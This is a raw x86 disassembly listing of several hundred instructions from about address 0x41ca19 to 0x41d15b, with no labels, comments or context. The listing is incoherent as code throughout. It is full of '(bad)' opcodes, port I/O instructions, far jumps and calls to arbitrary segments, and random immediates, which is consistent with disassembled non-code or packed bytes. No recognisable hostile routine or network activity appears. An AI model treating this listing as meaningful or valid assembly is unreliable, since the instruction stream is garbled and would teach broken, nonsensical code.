  41ca19:	mov    DWORD PTR [edi+0x3c],0x831db9b4
  41ca20:	push   es
  41ca21:	mov    ds:0x8eeafaf6,al
  41ca26:	ror    DWORD PTR [ebx+eiz*2],0xa0
  41ca2a:	cs jg  0x41ca12
  41ca2d:	sbb    BYTE PTR [ecx+0x109b436b],bl
  41ca33:	cwde   
  41ca34:	push   esp
  41ca35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca36:	daa    
  41ca37:	xor    BYTE PTR [ecx],dl
  41ca39:	push   0x968d7a11
  41ca3e:	cld    
  41ca3f:	pop    ds
  41ca40:	sbb    dl,ah
  41ca42:	xor    eax,0xcb8f3941
  41ca47:	push   ebp
  41ca48:	aam    0x66
  41ca4a:	adc    al,0x80
  41ca4c:	xchg   edx,eax
  41ca4d:	mov    bh,0x8c
  41ca4f:	jg     0x41ca1c
  41ca51:	jmp    0x41ca22
  41ca53:	or     DWORD PTR [edi-0x57bac803],edx
  41ca59:	pop    eax
  41ca5a:	mov    ds:0x74fe2715,al
  41ca5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca60:	mov    WORD PTR [ebx-0x37f22d2c],cs
  41ca66:	adc    DWORD PTR [ebx],ecx
  41ca68:	sbb    BYTE PTR [ebx],0x37
  41ca6b:	xlat   BYTE PTR ds:[ebx]
  41ca6c:	push   ecx
  41ca6d:	or     ebp,DWORD PTR [edi]
  41ca6f:	xchg   ebx,eax
  41ca70:	and    BYTE PTR [edi+0x5],bl
  41ca73:	xchg   edx,eax
  41ca74:	retf   
  41ca75:	add    DWORD PTR [edx-0x32],ecx
  41ca78:	cmp    eax,0x4bc3858d
  41ca7d:	leave  
  41ca7e:	inc    esp
  41ca7f:	mov    BYTE PTR [esi],al
  41ca81:	xchg   DWORD PTR [esi+0x1a],esi
  41ca84:	popf   
  41ca85:	push   ebx
  41ca86:	push   eax
  41ca87:	das    
  41ca88:	shr    ch,cl
  41ca8a:	xchg   BYTE PTR [esi+0x52],ah
  41ca8d:	mov    eax,0x671bd067
  41ca92:	(bad)  
  41ca93:	iret   
  41ca94:	(bad)  
  41ca95:	in     eax,0x93
  41ca97:	or     esp,DWORD PTR [esi]
  41ca99:	inc    esi
  41ca9a:	rcr    BYTE PTR [ebp+0x45],0xc1
  41ca9e:	fstp   QWORD PTR ds:0xf7e60a56
  41caa4:	outs   dx,BYTE PTR ds:[esi]
  41caa5:	or     BYTE PTR [edx],ah
  41caa7:	ins    BYTE PTR es:[edi],dx
  41caa8:	daa    
  41caa9:	sbb    eax,0x7d5903a3
  41caae:	enter  0xc1bf,0x41
  41cab2:	push   edx
  41cab3:	out    0x9d,eax
  41cab5:	int    0xe3
  41cab7:	and    bl,BYTE PTR [ecx+ecx*2+0x452175a9]
  41cabe:	clc    
  41cabf:	scas   eax,DWORD PTR es:[edi]
  41cac0:	out    0xfb,eax
  41cac2:	test   eax,0x9b00ae4c
  41cac7:	inc    esi
  41cac8:	and    eax,0xcb399dd0
  41cacd:	in     eax,0xac
  41cacf:	test   DWORD PTR [ecx+0x26],ebp
  41cad2:	sbb    dl,dh
  41cad4:	fadd   st(4),st
  41cad6:	jae    0x41cb11
  41cad8:	mov    esi,0x6bfda7d6
  41cadd:	push   eax
  41cade:	mov    edi,0x8a3ee05d
  41cae3:	retf   
  41cae4:	pop    ebx
  41cae5:	dec    edx
  41cae6:	inc    edi
  41cae7:	(bad)  
  41cae8:	in     al,dx
  41cae9:	jno    0x41cb47
  41caeb:	in     al,0x19
  41caed:	retf   
  41caee:	pusha  
  41caef:	out    dx,al
  41caf0:	scas   al,BYTE PTR es:[edi]
  41caf1:	xchg   esi,eax
  41caf2:	adc    esp,DWORD PTR [eax+0xb]
  41caf5:	mov    edi,0x9b7b377c
  41cafa:	cmp    cl,BYTE PTR [esi+0x23]
  41cafd:	sbb    edi,DWORD PTR [esi-0x11044d8]
  41cb03:	dec    ebp
  41cb04:	xchg   ebx,eax
  41cb05:	xchg   ecx,edx
  41cb07:	js     0x41ca98
  41cb09:	and    dh,dl
  41cb0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb0c:	das    
  41cb0d:	push   cs
  41cb0e:	xor    BYTE PTR [edx],dl
  41cb10:	xchg   esi,eax
  41cb11:	imul   esp,DWORD PTR [ecx],0x4b
  41cb14:	adc    BYTE PTR [ecx-0x5ac85711],dh
  41cb1a:	xor    BYTE PTR [esi],dh
  41cb1c:	scas   al,BYTE PTR es:[edi]
  41cb1d:	cdq    
  41cb1e:	push   edi
  41cb1f:	pop    ebp
  41cb20:	inc    esi
  41cb21:	xor    al,0x95
  41cb23:	ror    DWORD PTR [ecx+0x1f523d42],cl
  41cb29:	and    eax,0xc6515796
  41cb2e:	pop    esi
  41cb2f:	les    ecx,FWORD PTR [edi+eiz*8-0x1b]
  41cb33:	test   al,bh
  41cb35:	inc    esi
  41cb36:	xchg   esi,eax
  41cb37:	int3   
  41cb38:	pop    edx
  41cb39:	add    edi,ebp
  41cb3b:	or     eax,0x7d08f76
  41cb40:	cli    
  41cb41:	ret    0x9e10
  41cb44:	pop    ss
  41cb45:	lea    ecx,[edi+0x3f]
  41cb48:	mov    ch,0xdb
  41cb4a:	push   esi
  41cb4b:	or     BYTE PTR [ebx+0x33dcbe4a],0x5c
  41cb52:	aam    0x19
  41cb54:	outs   dx,BYTE PTR ds:[esi]
  41cb55:	cmp    DWORD PTR [esi+ecx*8+0x15592a9],ebx
  41cb5c:	xchg   edx,eax
  41cb5d:	inc    eax
  41cb5e:	pop    es
  41cb5f:	mov    ch,BYTE PTR [ebx-0x66]
  41cb62:	mov    eax,0x1e33892e
  41cb67:	cmp    BYTE PTR [ecx+esi*1],al
  41cb6a:	enter  0x832f,0xcf
  41cb6e:	jmp    0x6a95:0xdcb1b6f1
  41cb75:	push   ebx
  41cb76:	aam    0x7c
  41cb78:	gs pop es
  41cb7a:	stos   DWORD PTR es:[edi],eax
  41cb7b:	jb     0x41cbab
  41cb7d:	sub    DWORD PTR ds:0x87241a2b,esi
  41cb83:	hlt    
  41cb84:	xchg   ebp,eax
  41cb85:	jle    0x41cb99
  41cb87:	ss xchg ebp,eax
  41cb89:	cmp    al,0xe4
  41cb8b:	call   0xde75:0x115364d2
  41cb92:	cmp    ebp,DWORD PTR [edi+eiz*1+0x5]
  41cb96:	push   esi
  41cb97:	sbb    ch,BYTE PTR [ecx+edi*1+0x56d0f795]
  41cb9e:	lahf   
  41cb9f:	repz jle 0x41cbfd
  41cba2:	push   esp
  41cba3:	push   esp
  41cba4:	aas    
  41cba5:	or     cl,cl
  41cba7:	fdivr  st(6),st
  41cba9:	hlt    
  41cbaa:	add    edi,DWORD PTR [eax-0x44d4650f]
  41cbb0:	int    0xfe
  41cbb2:	lock adc ecx,DWORD PTR [eax-0x62b1e1a8]
  41cbb9:	inc    edx
  41cbba:	mov    eax,esi
  41cbbc:	jg     0x41cb9f
  41cbbe:	daa    
  41cbbf:	adc    al,0x30
  41cbc1:	ds sbb ah,ch
  41cbc4:	mov    bl,0x87
  41cbc6:	mov    DWORD PTR [esi],esi
  41cbc8:	pop    esi
  41cbc9:	cmp    BYTE PTR [eax+0x7b55188d],cl
  41cbcf:	mov    esp,0xbdce2607
  41cbd4:	cmp    ecx,DWORD PTR [esi+0x55f3dcb8]
  41cbda:	push   es
  41cbdb:	sub    ecx,edi
  41cbdd:	cwde   
  41cbde:	stc    
  41cbdf:	adc    BYTE PTR [eax-0x366fce58],bh
  41cbe5:	retf   
  41cbe6:	push   ss
  41cbe7:	call   0x909b68d8
  41cbec:	jo     0x41cc0b
  41cbee:	mov    dl,BYTE PTR [edi-0x45]
  41cbf1:	or     DWORD PTR [ebx+0x51],0xffffffb5
  41cbf5:	jecxz  0x41cc4f
  41cbf7:	pop    esp
  41cbf8:	lods   eax,DWORD PTR ds:[esi]
  41cbf9:	das    
  41cbfa:	mov    eax,ds:0xc27de19b
  41cbff:	sub    DWORD PTR [ecx-0xb],edi
  41cc02:	aas    
  41cc03:	es cld 
  41cc05:	rol    BYTE PTR [edi+edi*1],0xa0
  41cc09:	leave  
  41cc0a:	xchg   ebx,eax
  41cc0b:	fld    DWORD PTR [edx+0x4d]
  41cc0e:	scas   al,BYTE PTR es:[edi]
  41cc0f:	in     eax,0xb6
  41cc11:	xchg   edx,eax
  41cc12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc13:	cmp    al,0xac
  41cc15:	js     0x41cc28
  41cc17:	xor    ah,BYTE PTR [esp+edx*2-0x668d5956]
  41cc1e:	dec    edi
  41cc1f:	inc    eax
  41cc20:	push   0xd58e95e4
  41cc25:	xor    eax,DWORD PTR [ebp+0x32]
  41cc28:	ret    0x8b0
  41cc2b:	mov    ecx,0xb7584307
  41cc30:	jg     0x41cc95
  41cc32:	inc    ecx
  41cc33:	xchg   esp,eax
  41cc34:	adc    al,0x22
  41cc36:	test   DWORD PTR [edi+0x1e],ebp
  41cc39:	mov    al,ds:0x1afce948
  41cc3e:	xchg   ebp,eax
  41cc3f:	push   0xcfc9bb8
  41cc44:	shl    BYTE PTR [esi+0x56],1
  41cc47:	dec    ebp
  41cc48:	add    esi,DWORD PTR [edx+0x70]
  41cc4b:	sub    ebp,0x20
  41cc4e:	pop    edi
  41cc4f:	adc    DWORD PTR ds:0x2b715fac,ebx
  41cc55:	cmp    cl,BYTE PTR [edi+0x2574f34d]
  41cc5b:	dec    ebp
  41cc5c:	jae    0x127dddf7
  41cc62:	add    ch,bl
  41cc64:	push   edi
  41cc65:	jge    0x41cc5f
  41cc67:	or     eax,0x178db284
  41cc6c:	push   ebx
  41cc6d:	jl     0x41ccb0
  41cc6f:	mov    bl,bl
  41cc71:	push   edi
  41cc72:	or     DWORD PTR [edx+0x5831e20f],edx
  41cc78:	out    dx,al
  41cc79:	sub    eax,edx
  41cc7b:	ret    
  41cc7c:	(bad)  
  41cc7d:	(bad)  
  41cc7e:	cmp    al,0x45
  41cc80:	idiv   DWORD PTR [esi-0x49cadf75]
  41cc86:	push   0xa89ab0bc
  41cc8b:	adc    al,0xc0
  41cc8d:	or     dh,dl
  41cc8f:	pop    esp
  41cc90:	xlat   BYTE PTR ds:[ebx]
  41cc91:	inc    ecx
  41cc92:	and    BYTE PTR [ecx+0x5864b11d],dl
  41cc98:	pmuludq mm2,QWORD PTR [esp+esi*8-0x60bcd665]
  41cca0:	mov    ds:0x770f1d2b,al
  41cca5:	xor    esi,DWORD PTR cs:[edx]
  41cca8:	push   eax
  41cca9:	stos   DWORD PTR es:[edi],eax
  41ccaa:	lock in al,dx
  41ccac:	pop    edi
  41ccad:	es ret 0xddeb
  41ccb1:	jmp    0x41ccc9
  41ccb3:	cld    
  41ccb4:	xchg   ebx,eax
  41ccb5:	sahf   
  41ccb6:	je     0x41ccd0
  41ccb8:	ret    0x63d8
  41ccbb:	call   0x7881a0cb
  41ccc0:	cmp    ebp,DWORD PTR [ebx]
  41ccc2:	aaa    
  41ccc3:	adc    eax,0xfc5d1e5d
  41ccc8:	xchg   ecx,eax
  41ccc9:	sbb    al,0x4f
  41cccb:	xor    dl,bl
  41cccd:	or     BYTE PTR [eax-0x48],al
  41ccd0:	std    
  41ccd1:	aad    0xcd
  41ccd3:	push   esp
  41ccd4:	outs   dx,BYTE PTR ds:[esi]
  41ccd5:	push   ebp
  41ccd6:	rcl    DWORD PTR [eax-0x11],cl
  41ccd9:	adc    al,dh
  41ccdb:	sub    DWORD PTR ss:[edi-0x32760169],0x36
  41cce3:	xchg   esp,eax
  41cce4:	add    cl,BYTE PTR [ebp-0x2e9165aa]
  41ccea:	or     BYTE PTR [ecx-0x36ef165],ch
  41ccf0:	add    eax,0xf7e72645
  41ccf5:	int3   
  41ccf6:	push   ecx
  41ccf7:	imul   esi,DWORD PTR [ecx+0x2],0xffffffb8
  41ccfb:	xchg   ebp,eax
  41ccfc:	push   ebx
  41ccfd:	mov    ah,0x38
  41ccff:	cmp    DWORD PTR [eax-0x7d],esp
  41cd02:	outs   dx,DWORD PTR ds:[esi]
  41cd03:	stos   BYTE PTR es:[edi],al
  41cd04:	jbe    0x41cd47
  41cd06:	and    DWORD PTR [edi-0x6df31fcd],0xd6ea4c3d
  41cd10:	push   esp
  41cd11:	xor    al,0x93
  41cd13:	outs   dx,BYTE PTR ds:[esi]
  41cd14:	ret    
  41cd15:	jmp    0xc040b73a
  41cd1a:	inc    edi
  41cd1b:	add    eax,0xda1351f4
  41cd20:	or     bh,BYTE PTR [ebp-0x20]
  41cd23:	fchs   
  41cd25:	pop    es
  41cd26:	push   edx
  41cd27:	lods   eax,DWORD PTR ds:[esi]
  41cd28:	das    
  41cd29:	fucomi st,st(5)
  41cd2b:	popf   
  41cd2c:	ror    DWORD PTR [esi+0x40f0e06c],0x5a
  41cd33:	mov    ds:0xde82c268,eax
  41cd38:	xchg   ecx,eax
  41cd39:	add    al,0x46
  41cd3b:	inc    edi
  41cd3c:	lock popf 
  41cd3e:	lods   al,BYTE PTR gs:[esi]
  41cd40:	(bad)  
  41cd41:	sub    eax,DWORD PTR [ebx-0x9]
  41cd44:	es jmp 0xf7d0:0x280581f9
  41cd4c:	push   ds
  41cd4d:	or     eax,0xf9f73f4a
  41cd52:	retf   0x53a
  41cd55:	gs lahf 
  41cd57:	adc    BYTE PTR [esi-0xf539b85],al
  41cd5d:	ins    BYTE PTR es:[edi],dx
  41cd5e:	imul   ebx,DWORD PTR ds:0x53f98199,0xabb5e7c5
  41cd68:	or     DWORD PTR [edx-0x709aad96],edx
  41cd6e:	pusha  
  41cd6f:	imul   ebp,DWORD PTR [edi+eiz*1-0x57a55b0],0x49
  41cd77:	mov    bh,bl
  41cd79:	retf   0x230f
  41cd7c:	pop    es
  41cd7d:	mov    ecx,0xc48e4c9f
  41cd82:	jecxz  0x41cd4a
  41cd84:	fisttp DWORD PTR [edi]
  41cd86:	out    dx,al
  41cd87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd88:	mov    eax,ds:0x33529dd0
  41cd8d:	cdq    
  41cd8e:	stos   DWORD PTR es:[edi],eax
  41cd8f:	test   al,0x7e
  41cd91:	push   edx
  41cd92:	fst    DWORD PTR [ebp-0x42]
  41cd95:	sbb    DWORD PTR cs:[eax],ebx
  41cd98:	jmp    0xf59b:0xd7547d25
  41cd9f:	fisttp WORD PTR [edx+0x7e1ecbd5]
  41cda5:	retf   0x76c7
  41cda8:	pop    edx
  41cda9:	and    edi,DWORD PTR [edx]
  41cdab:	icebp  
  41cdac:	jge    0x41cd78
  41cdae:	pop    eax
  41cdaf:	test   edi,ebp
  41cdb1:	jl     0x41cdd6
  41cdb3:	popa   
  41cdb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cdb5:	movq   mm5,QWORD PTR [eax-0x766f79ba]
  41cdbc:	not    dl
  41cdbe:	das    
  41cdbf:	mov    es,WORD PTR [eax+0x14]
  41cdc2:	gs jle 0x41ce2c
  41cdc5:	(bad)  
  41cdc6:	lods   eax,DWORD PTR ds:[esi]
  41cdc7:	out    0xb7,al
  41cdc9:	add    BYTE PTR cs:[ebx-0x3be4df05],dh
  41cdd0:	imul   edi,ebx,0x14cb992e
  41cdd6:	mov    al,0xe0
  41cdd8:	inc    BYTE PTR [ebx]
  41cdda:	mov    bl,0xe4
  41cddc:	push   0x3c
  41cdde:	ins    DWORD PTR es:[edi],dx
  41cddf:	pop    ds
  41cde0:	dec    eax
  41cde1:	iret   
  41cde2:	inc    ebp
  41cde3:	sar    DWORD PTR [ebx-0x7b1ecc64],1
  41cde9:	bound  edi,QWORD PTR [eax+0x60]
  41cdec:	pop    es
  41cded:	sbb    ecx,DWORD PTR [esi-0x1b5776ba]
  41cdf3:	fwait
  41cdf4:	xchg   esp,esp
  41cdf6:	and    DWORD PTR [ebx],eax
  41cdf8:	add    BYTE PTR [edi-0x70],ah
  41cdfb:	pop    es
  41cdfc:	push   0xffffff90
  41cdfe:	aam    0x1b
  41ce00:	stos   DWORD PTR es:[edi],eax
  41ce01:	out    dx,al
  41ce02:	leave  
  41ce03:	jge    0x41cd9b
  41ce05:	call   0xd53d:0x1e581499
  41ce0c:	(bad)  
  41ce0d:	and    al,BYTE PTR [ebp-0x40]
  41ce10:	dec    edi
  41ce11:	jl     0x41ce2e
  41ce13:	dec    edi
  41ce14:	lds    ebx,FWORD PTR [eax]
  41ce16:	aaa    
  41ce17:	cmp    BYTE PTR [edx+0x61],bh
  41ce1a:	clc    
  41ce1b:	and    al,BYTE PTR [ebp-0x22]
  41ce1e:	das    
  41ce1f:	jecxz  0x41cdd6
  41ce21:	jno    0x41ce08
  41ce23:	push   0x323a3760
  41ce28:	add    eax,0x1a901c33
  41ce2d:	mov    dh,0x1e
  41ce2f:	dec    ebx
  41ce30:	jle    0x41ceae
  41ce32:	scas   eax,DWORD PTR es:[edi]
  41ce33:	scas   al,BYTE PTR es:[edi]
  41ce34:	jae    0x41ce2f
  41ce36:	int3   
  41ce37:	or     BYTE PTR [ebp-0x473789f7],0x2a
  41ce3e:	inc    ebp
  41ce3f:	adc    al,0x21
  41ce41:	adc    BYTE PTR [ebx-0x3135a8d7],0xc6
  41ce48:	push   eax
  41ce49:	out    0x48,al
  41ce4b:	stc    
  41ce4c:	or     al,0x90
  41ce4e:	aaa    
  41ce4f:	shr    BYTE PTR [edx-0x4657df22],1
  41ce55:	adc    BYTE PTR [ecx-0x69],ch
  41ce58:	cmc    
  41ce59:	aam    0xe8
  41ce5b:	xchg   DWORD PTR [ecx+0x21012f72],esi
  41ce61:	mov    bh,0xb8
  41ce63:	cmp    BYTE PTR [esi+0x292a9f0a],cl
  41ce69:	rol    DWORD PTR ds:0xba1f6a5c,cl
  41ce6f:	xchg   DWORD PTR [eax+0x738ae871],esp
  41ce75:	pop    ebp
  41ce76:	adc    al,0x4a
  41ce78:	fwait
  41ce79:	ret    0xaaf
  41ce7c:	inc    edi
  41ce7d:	push   eax
  41ce7e:	scas   al,BYTE PTR es:[edi]
  41ce7f:	imul   esi,edi,0x113a8ba5
  41ce85:	ins    BYTE PTR es:[edi],dx
  41ce86:	lahf   
  41ce87:	push   cs
  41ce88:	adc    eax,0x9e5305fc
  41ce8d:	xchg   ecx,eax
  41ce8e:	fst    QWORD PTR [esi+0x5a903122]
  41ce94:	shl    BYTE PTR [eax],1
  41ce96:	add    BYTE PTR [ecx],dl
  41ce98:	mov    al,ds:0xa5d8f588
  41ce9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce9e:	jmp    0x41ce5c
  41cea0:	jno    0x41ce68
  41cea2:	cld    
  41cea3:	stc    
  41cea4:	mov    edi,0xb847ea68
  41cea9:	adc    eax,0x8e54be2b
  41ceae:	adc    al,BYTE PTR [eax+0x5ce5f6f0]
  41ceb4:	push   ebx
  41ceb5:	sbb    BYTE PTR [edi],0x19
  41ceb8:	xor    al,0x67
  41ceba:	xchg   ebx,eax
  41cebb:	int3   
  41cebc:	aas    
  41cebd:	jae    0x41cea5
  41cebf:	xor    bh,BYTE PTR [ebp-0x2c]
  41cec2:	cmp    dh,BYTE PTR [edx+0x7d63410c]
  41cec8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cec9:	loope  0x41cf2f
  41cecb:	sub    al,BYTE PTR es:[ebx]
  41cece:	sbb    eax,0xebb4c6b2
  41ced3:	xchg   esp,eax
  41ced4:	and    eax,0xd9f63ed2
  41ced9:	xlat   BYTE PTR ds:[ebx]
  41ceda:	push   cs
  41cedb:	ret    0x6f8d
  41cede:	stos   BYTE PTR es:[edi],al
  41cedf:	jle    0x41ce61
  41cee1:	xchg   edi,eax
  41cee2:	dec    edx
  41cee3:	sub    DWORD PTR [edi-0x42bb5c0a],0x1c
  41ceea:	fnstenv ds:0x9b68cd92
  41cef0:	outs   dx,BYTE PTR ds:[esi]
  41cef1:	sbb    eax,0xf3ed2025
  41cef6:	inc    edi
  41cef7:	xchg   ebx,eax
  41cef8:	inc    esi
  41cef9:	inc    esp
  41cefa:	xchg   esp,esp
  41cefc:	dec    ecx
  41cefd:	pop    esi
  41cefe:	sub    DWORD PTR [edi-0x51d58846],edi
  41cf04:	sbb    al,0xbe
  41cf06:	sub    DWORD PTR [ecx],ebp
  41cf08:	push   edi
  41cf09:	call   0x4b40:0xc23feddc
  41cf10:	and    al,0x5b
  41cf12:	in     eax,0x5e
  41cf14:	xchg   edx,eax
  41cf15:	push   esp
  41cf16:	xchg   ebx,eax
  41cf17:	mov    dl,0x49
  41cf19:	add    edx,ebp
  41cf1b:	xor    esi,eax
  41cf1d:	and    al,0x19
  41cf1f:	add    DWORD PTR [edx],0x2c
  41cf22:	loopne 0x41cee0
  41cf24:	mul    esi
  41cf26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf27:	or     DWORD PTR [esi],eax
  41cf29:	js     0x41cf9d
  41cf2b:	push   ss
  41cf2c:	jno    0x41cec4
  41cf2e:	sub    eax,0x1b579161
  41cf33:	sbb    BYTE PTR [edx-0x3bb86f1c],dl
  41cf39:	push   ebp
  41cf3a:	xor    dl,BYTE PTR [edx+0x2f4b328c]
  41cf40:	or     DWORD PTR [edx+0x67f230af],edx
  41cf46:	mov    ch,0xda
  41cf48:	jae    0x41cf3b
  41cf4a:	call   0x677a:0xff0dd47d
  41cf51:	xchg   ebp,eax
  41cf52:	mov    esp,0xdac975b2
  41cf57:	test   BYTE PTR [esi+edx*2],0x51
  41cf5b:	push   ebx
  41cf5c:	sar    DWORD PTR [edi-0x3bda4b40],0x56
  41cf63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf64:	call   0xb5d75576
  41cf69:	push   ss
  41cf6a:	and    edi,DWORD PTR [edi-0x1492c6a4]
  41cf70:	nop
  41cf71:	mov    bl,0x5
  41cf73:	int    0x3c
  41cf75:	sbb    DWORD PTR [edx],edi
  41cf77:	iret   
  41cf78:	in     al,0x8b
  41cf7a:	jnp    0x41cf24
  41cf7c:	dec    edx
  41cf7d:	inc    ebp
  41cf7e:	pop    esi
  41cf7f:	js     0x41cf62
  41cf81:	mov    bl,0x6d
  41cf83:	(bad)  
  41cf84:	mov    edi,0x387fc123
  41cf89:	ror    esp,cl
  41cf8b:	pushf  
  41cf8c:	cs pop es
  41cf8e:	xchg   DWORD PTR [eax+0x2d],eax
  41cf91:	fisubr WORD PTR [ebp-0x34054ad9]
  41cf97:	jmp    0xe176e4ce
  41cf9c:	lea    ebx,[esi-0x4dc0b81e]
  41cfa2:	ror    al,0x74
  41cfa5:	outs   dx,BYTE PTR ds:[esi]
  41cfa6:	adc    al,BYTE PTR [ecx+ecx*8]
  41cfa9:	into   
  41cfaa:	retf   0x287d
  41cfad:	pop    ss
  41cfae:	mov    dh,0x4f
  41cfb0:	ins    BYTE PTR es:[edi],dx
  41cfb1:	or     cl,BYTE PTR [eax]
  41cfb3:	faddp  st(4),st
  41cfb5:	sbb    eax,0x4c46a7d9
  41cfba:	outs   dx,DWORD PTR ds:[esi]
  41cfbb:	jle    0x41cfe7
  41cfbd:	scas   eax,DWORD PTR es:[edi]
  41cfbe:	dec    ebx
  41cfbf:	shl    BYTE PTR [ebx],1
  41cfc1:	xchg   BYTE PTR [ebx+0x34],bh
  41cfc4:	fwait
  41cfc5:	mov    bl,0xcd
  41cfc7:	fisttp QWORD PTR [ebx-0x28]
  41cfca:	push   ebx
  41cfcb:	mov    ebp,0xb184c3fa
  41cfd0:	loopne 0x41d010
  41cfd2:	cs dec esi
  41cfd4:	repnz mov ds:0xf2215e5b,eax
  41cfda:	ficom  WORD PTR [ebp+0x6d]
  41cfdd:	push   edi
  41cfde:	cld    
  41cfdf:	fcmovnu st,st(3)
  41cfe1:	mov    dl,0x8
  41cfe3:	addr16 loop 0x41cf88
  41cfe6:	pop    ebx
  41cfe7:	in     al,dx
  41cfe8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cfe9:	ja     0x41cfb9
  41cfeb:	jg     0x41cf8a
  41cfed:	sbb    dh,0x63
  41cff0:	adc    bh,ah
  41cff2:	ja     0x41d055
  41cff4:	lock outs dx,BYTE PTR ds:[esi]
  41cff6:	add    BYTE PTR [eax-0x7],bh
  41cff9:	mov    eax,0xc6982626
  41cffe:	fnstenv [eax+eiz*2+0x13]
  41d002:	int3   
  41d003:	add    eax,0xdf5d5d47
  41d008:	xor    eax,0x2c6cd460
  41d00d:	push   ebx
  41d00e:	int    0x1f
  41d010:	push   cs
  41d011:	push   esi
  41d012:	and    BYTE PTR [eax-0x40],bh
  41d015:	inc    ebx
  41d016:	jecxz  0x41cff0
  41d018:	cld    
  41d019:	mov    WORD PTR [ebx+0x26],ds
  41d01c:	mov    ds:0x6b5aca01,al
  41d021:	push   edx
  41d022:	(bad)  
  41d024:	pop    ebp
  41d025:	jge    0x41d080
  41d027:	clc    
  41d028:	pop    edi
  41d029:	sbb    DWORD PTR [edx-0x278ff68],eax
  41d02f:	fistp  QWORD PTR [edi+0x5fa58b0a]
  41d035:	jne    0x41cfeb
  41d037:	xchg   esi,eax
  41d038:	loopne 0x41cfe5
  41d03a:	or     dl,al
  41d03c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d03d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d03e:	add    DWORD PTR [edi+0x4faa4016],eax
  41d044:	out    0x89,eax
  41d046:	adc    ebp,DWORD PTR [esi+0x4]
  41d049:	ja     0x41cff7
  41d04b:	pop    ebx
  41d04c:	dec    esp
  41d04d:	sub    BYTE PTR [ebx],bl
  41d04f:	or     DWORD PTR [ecx+0x30],0xffffffc7
  41d053:	not    DWORD PTR [esi]
  41d055:	nop
  41d056:	lahf   
  41d057:	shl    DWORD PTR [ecx-0xdd7e4f7],0x4b
  41d05e:	pop    esi
  41d05f:	pop    esp
  41d060:	mov    ds:0x1470fefb,eax
  41d065:	mov    al,ds:0xe73fec08
  41d06a:	comiss xmm7,DWORD PTR [esi-0x15]
  41d06e:	fcom   QWORD PTR [eax+0x5b676c7c]
  41d074:	fidivr DWORD PTR [eax+0x213a1300]
  41d07a:	arpl   WORD PTR [edx-0x68dbadcf],bx
  41d080:	mov    esp,0xa685d79
  41d085:	mov    dl,0xd0
  41d087:	(bad)  [ebx]
  41d089:	popf   
  41d08a:	ins    DWORD PTR es:[edi],dx
  41d08b:	jnp    0x41d02e
  41d08d:	mov    ds:0x9cfa6cd0,eax
  41d092:	pop    ebx
  41d093:	pusha  
  41d094:	and    eax,0xa66c33d2
  41d099:	adc    ebx,DWORD PTR [ebx-0x70]
  41d09c:	sub    DWORD PTR [esi-0x2d5f48d1],ebx
  41d0a2:	repnz out 0x6c,eax
  41d0a5:	nop
  41d0a6:	retf   
  41d0a7:	adc    ch,BYTE PTR [esi+0x6a]
  41d0aa:	push   ds
  41d0ab:	xchg   ebp,eax
  41d0ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d0ad:	out    0xdb,eax
  41d0af:	lods   eax,DWORD PTR ds:[esi]
  41d0b0:	(bad)  
  41d0b1:	fnstcw WORD PTR [ecx]
  41d0b3:	xchg   ecx,eax
  41d0b4:	in     eax,0xa
  41d0b6:	imul   eax,DWORD PTR ds:0x16fc14a2,0x8bec9728
  41d0c0:	imul   ebx
  41d0c2:	fisub  DWORD PTR [esi]
  41d0c4:	adc    DWORD PTR [esi+0x625b78b0],esi
  41d0ca:	popf   
  41d0cb:	adc    eax,0xf9fdc324
  41d0d0:	test   eax,0x8117d8c
  41d0d5:	sahf   
  41d0d6:	out    0x71,al
  41d0d8:	ins    DWORD PTR es:[edi],dx
  41d0d9:	in     al,0x91
  41d0db:	hlt    
  41d0dc:	mov    ebx,0x2a33cf77
  41d0e1:	aam    0x77
  41d0e3:	cmp    esp,DWORD PTR [ebp-0xc68bd7e]
  41d0e9:	mov    ebx,0xe23a2304
  41d0ee:	ja     0x41d0a5
  41d0f0:	(bad)  
  41d0f1:	fwait
  41d0f2:	mov    ebx,0xd7f5440e
  41d0f7:	jns    0x41d165
  41d0f9:	add    eax,0xd3957415
  41d0fe:	fst    QWORD PTR [ebp+0x6e]
  41d101:	dec    ecx
  41d102:	sbb    cl,BYTE PTR [ebx]
  41d104:	(bad)  
  41d105:	cwde   
  41d106:	scas   al,BYTE PTR es:[edi]
  41d107:	push   eax
  41d108:	pop    ebx
  41d109:	arpl   WORD PTR [edi+0x35],cx
  41d10c:	stos   DWORD PTR es:[edi],eax
  41d10d:	mov    dh,0x37
  41d10f:	push   0xbf10320f
  41d114:	(bad)  
  41d115:	(bad)  
  41d117:	and    eax,0x912679a6
  41d11c:	mov    al,0x30
  41d11e:	adc    eax,0x636ba9a3
  41d123:	repz sub eax,0x6d63af64
  41d129:	cli    
  41d12a:	sbb    al,0xe1
  41d12c:	adc    DWORD PTR [eax-0xc],ebx
  41d12f:	inc    ecx
  41d130:	xlat   BYTE PTR ds:[ebx]
  41d131:	mov    eax,ds:0x12cb9a63
  41d136:	push   ds
  41d137:	lock loope 0x41d0f6
  41d13a:	cmp    edi,DWORD PTR [ecx-0x5b]
  41d13d:	pop    ebp
  41d13e:	add    DWORD PTR [edi+esi*2-0x68a97694],edi
  41d145:	inc    ebp
  41d146:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d147:	lahf   
  41d148:	ins    DWORD PTR es:[edi],dx
  41d149:	(bad)  
  41d14a:	clc    
  41d14b:	push   ss
  41d14c:	jl     0x41d19e
  41d14e:	push   0x1e
  41d150:	dec    edx
  41d151:	sub    al,dl
  41d153:	sbb    BYTE PTR [edx+0x21],dh
  41d156:	add    eax,DWORD PTR [si-0x2808]
  41d15b:	ins    DWORD PTR es:[edi],dx
